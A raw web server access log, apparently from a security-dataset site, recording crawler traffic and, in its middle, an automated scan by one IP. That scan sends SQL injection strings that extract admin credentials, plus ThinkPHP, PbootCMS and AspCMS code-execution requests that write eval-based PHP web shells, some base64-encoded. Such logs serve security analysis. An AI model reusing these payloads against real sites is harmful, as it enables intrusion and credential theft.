54.36.150.175 - - [21/Mar/2019:02:12:01 -0700] "GET /self.logs/2015/error.log.2015-10-26.gz HTTP/1.1" 200 907 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.58 - - [21/Mar/2019:13:03:20 -0700] "GET /self.logs/2015/error.log.2015-09-05.gz HTTP/1.1" 200 598 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.23 - - [21/Mar/2019:13:03:44 -0700] "GET /self.logs/access.log.2018-09-17.gz HTTP/1.1" 200 30791 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
218.107.17.224 - - [21/Mar/2019:13:04:24 -0700] "GET /pe_static/zeus.zip HTTP/1.1" 200 51367111 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36" 
100.27.37.89 - - [21/Mar/2019:13:04:31 -0700] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring" 
100.27.37.89 - - [21/Mar/2019:13:04:31 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring" 
54.36.148.113 - - [21/Mar/2019:13:04:46 -0700] "GET /self.logs/error.log.2016-11-12.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
41.223.160.131 - - [21/Mar/2019:13:04:47 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.148.217 - - [21/Mar/2019:13:08:05 -0700] "GET /self.logs/error.log.2018-03-22.gz HTTP/1.1" 200 3915 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
39.54.148.196 - - [21/Mar/2019:13:11:41 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
39.54.148.196 - - [21/Mar/2019:13:11:42 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.148.131 - - [21/Mar/2019:13:13:46 -0700] "GET /self.logs/access.log.2016-02-10.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.241 - - [21/Mar/2019:13:17:13 -0700] "GET /self.logs/access.log.2017-05-17.gz HTTP/1.1" 200 30328 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.47.142.199 - - [21/Mar/2019:13:19:59 -0700] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 200 1603 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
51.255.65.46 - - [21/Mar/2019:13:22:40 -0700] "GET /self.logs/error.log.2015-01-19.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
70.124.158.4 - - [21/Mar/2019:13:27:41 -0700] "GET /Datasets%20Description/PE_malware/OPCleaver.html HTTP/1.1" 200 1352 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" 
157.55.39.239 - - [21/Mar/2019:13:29:23 -0700] "GET /self.logs/error.log.2018-07-11.gz HTTP/1.1" 200 6668 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.34 - - [21/Mar/2019:13:29:25 -0700] "GET /self.logs/error.log.2018-07-01.gz HTTP/1.1" 200 5698 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
98.159.213.242 - - [21/Mar/2019:13:30:43 -0700] "GET / HTTP/1.1" 304 189 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
98.159.213.242 - - [21/Mar/2019:13:30:44 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
98.159.213.242 - - [21/Mar/2019:13:30:52 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 51408672 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
80.12.41.234 - - [21/Mar/2019:13:31:10 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 41841296 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0" 
95.163.255.178 - - [21/Mar/2019:13:32:19 -0700] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
95.163.255.181 - - [21/Mar/2019:13:32:21 -0700] "GET /self.logs/?C=N;O=D HTTP/1.1" 200 15435 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
180.97.35.59 - - [21/Mar/2019:13:32:56 -0700] "GET / HTTP/1.1" 301 483 "http://www.baidu.com/s?wd=telephoneyw8" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
180.97.35.15 - - [21/Mar/2019:13:32:57 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
95.163.255.164 - - [21/Mar/2019:13:33:50 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/http.html HTTP/1.1" 200 1891 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
202.46.129.70 - - [21/Mar/2019:13:34:32 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
202.46.129.70 - - [21/Mar/2019:13:34:32 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.148.203 - - [21/Mar/2019:13:36:43 -0700] "GET /self.logs/access.log.2018-08-20.gz HTTP/1.1" 200 24483 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
80.12.41.234 - - [21/Mar/2019:13:32:28 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 549098528 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0" 
54.36.150.140 - - [21/Mar/2019:13:38:27 -0700] "GET /self.logs/access.log.2015-07-31.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
13.66.139.0 - - [21/Mar/2019:13:39:53 -0700] "GET /self.logs/access.log.2017-03-04.gz HTTP/1.1" 200 15699 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.17 - - [21/Mar/2019:13:40:26 -0700] "GET /self.logs/access.log.2015-11-26.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
40.77.167.112 - - [21/Mar/2019:13:40:43 -0700] "GET /self.logs/access.log.2019-03-02.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.241 - - [21/Mar/2019:13:40:58 -0700] "GET /self.logs/access.log.2017-01-28.gz HTTP/1.1" 200 17566 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
190.24.31.99 - - [21/Mar/2019:13:44:20 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
113.171.224.176 - - [21/Mar/2019:13:44:55 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.148.8 - - [21/Mar/2019:13:45:35 -0700] "GET /self.logs/error.log.2016-09-14.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.33 - - [21/Mar/2019:13:50:37 -0700] "GET /self.logs/access.log.2018-12-17.gz HTTP/1.1" 200 23507 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
103.200.31.194 - - [21/Mar/2019:13:52:25 -0700] "GET //plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294 HTTP/1.1" 301 1124 "http://secrepo.com//plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:26 -0700] "GET /plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294 HTTP/1.1" 404 295 "http://secrepo.com//plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:26 -0700] "GET //NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20 HTTP/1.1" 301 719 "http://secrepo.com//NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:27 -0700] "POST //index.php/api/Uploadify/preview HTTP/1.1" 301 559 "http://secrepo.com//index.php/api/Uploadify/preview" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:27 -0700] "GET //user.php?act=login HTTP/1.1" 301 533 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:27 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:27 -0700] "GET //user.php?act=login HTTP/1.1" 301 533 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:289:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:28 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:289:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:28 -0700] "GET //d.php HTTP/1.1" 301 507 "http://secrepo.com//d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:28 -0700] "GET //faq.php?action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23 HTTP/1.1" 301 901 "http://secrepo.com//faq.php?action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:28 -0700] "GET //plus/moon.php HTTP/1.1" 301 523 "http://secrepo.com//plus/moon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:29 -0700] "GET //plus/mytag_js.php?aid=9090 HTTP/1.1" 301 549 "http://secrepo.com//plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:29 -0700] "POST //phpmyadmin/index.php HTTP/1.1" 301 537 "http://secrepo.com//phpmyadmin/index.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:29 -0700] "GET //type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss HTTP/1.1" 301 667 "http://secrepo.com//type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:30 -0700] "GET //data/cache_template/rss.tpl.php HTTP/1.1" 301 559 "http://secrepo.com//data/cache_template/rss.tpl.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:30 -0700] "GET //data/backupdata/dede_a~1.txt HTTP/1.1" 301 553 "http://secrepo.com//data/backupdata/dede_a~1.txt" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:31 -0700] "GET //data/backupdata/dede_a~2.txt HTTP/1.1" 301 553 "http://secrepo.com//data/backupdata/dede_a~2.txt" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:31 -0700] "GET //data/backupdata/dede_a~3.txt HTTP/1.1" 301 553 "http://secrepo.com//data/backupdata/dede_a~3.txt" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:31 -0700] "GET //data/backupdata/dede_a~4.txt HTTP/1.1" 301 553 "http://secrepo.com//data/backupdata/dede_a~4.txt" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:32 -0700] "GET //data/backupdata/dede_a~5.txt HTTP/1.1" 301 553 "http://secrepo.com//data/backupdata/dede_a~5.txt" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:32 -0700] "GET //?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?> HTTP/1.1" 301 733 "http://secrepo.com//?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php @eval($_POST[admin]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:32 -0700] "GET //robots1.php HTTP/1.1" 301 519 "http://secrepo.com//robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:33 -0700] "GET //?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" 301 1233 "http://secrepo.com//?" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:33 -0700] "GET //12345.php HTTP/1.1" 301 515 "http://secrepo.com//12345.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:33 -0700] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" 301 1048 "http://secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:33 -0700] "GET //robots.php HTTP/1.1" 301 517 "http://secrepo.com//robots.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:34 -0700] "GET //?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs)); HTTP/1.1" 301 951 "http://secrepo.com//?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:34 -0700] "GET //x.php HTTP/1.1" 301 507 "http://secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:34 -0700] "GET //news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html HTTP/1.1" 301 1021 "http://secrepo.com//news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:35 -0700] "GET //index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs HTTP/1.1" 301 827 "http://secrepo.com//index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:35 -0700] "GET //uploadfile/member/0/0x0.php HTTP/1.1" 301 551 "http://secrepo.com//uploadfile/member/0/0x0.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:35 -0700] "POST //index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 301 601 "http://secrepo.com//index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
103.200.31.194 - - [21/Mar/2019:13:52:36 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 295 "http://secrepo.com//index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
103.200.31.194 - - [21/Mar/2019:13:52:37 -0700] "GET //index.php/list/5/?current={pboot:if(eval\\\\($_GET['a']))}1{/pboot:if}&a=fputs(fopen(base64_decode('eC5waHA'),'w'),%20base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyd4YiddKTsgPz54YnNoZWxs')); HTTP/1.1" 301 867 "http://secrepo.com//index.php/list/5/?current={pboot:if(eval\\\\($_GET['a']))}1{/pboot:if}&a=fputs(fopen(base64_decode('eC5waHA'),'w'), base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyd4YiddKTsgPz54YnNoZWxs'));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:37 -0700] "GET //x.php HTTP/1.1" 301 507 "http://secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:37 -0700] "GET //SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest HTTP/1.1" 301 1103 "http://secrepo.com//SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:38 -0700] "GET //SiteFiles/SiteTemplates/sectest/include.aspx HTTP/1.1" 301 585 "http://secrepo.com//SiteFiles/SiteTemplates/sectest/include.aspx" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:38 -0700] "POST //index.php?s=index HTTP/1.1" 301 531 "http://secrepo.com//index.php?s=index" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.200.31.194 - - [21/Mar/2019:13:52:38 -0700] "GET //admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\xe2\x80\x9d,%201,%20\xe2\x80\x9crunMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&SwitchComments=1&SwitchCommentsStatus=1&switchFaq=0:Y=request(chr(35)):execute(Y)&SwitchFaqStatus=0&dirtyStr=&waterMark=1&waterMarkFont=hahahaha&waterMarkLocation=1&smtp_usermail=aspcmstest%40163.com&smtp_user=aspcmstest&smtp_password=aspcms.cn&smtp_server=smtp.163.com&MessageAlertsEmail=13322712%40qq.com&messageReminded=1&orderReminded=1&applyReminded=1&commentReminded=1&LanguageID=1 HTTP/1.1" 301 1687 "http://secrepo.com//admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\xa1\xb1, 1, \xa1\xb0runMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&SwitchComments=1&SwitchCommentsStatus=1&switchFaq=0:Y=request(chr(35)):execute(Y)&SwitchFaqStatus=0&dirtyStr=&waterMark=1&waterMarkFont=hahahaha&waterMarkLocation=1&smtp_usermail=aspcmstest%40163.com&smtp_user=aspcmstest&smtp_password=aspcms.cn&smtp_server=smtp.163.com&MessageAlertsEmail=13322712%40qq.com&messageReminded=1&orderReminded=1&applyReminded=1&commentReminded=1&LanguageID=1" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
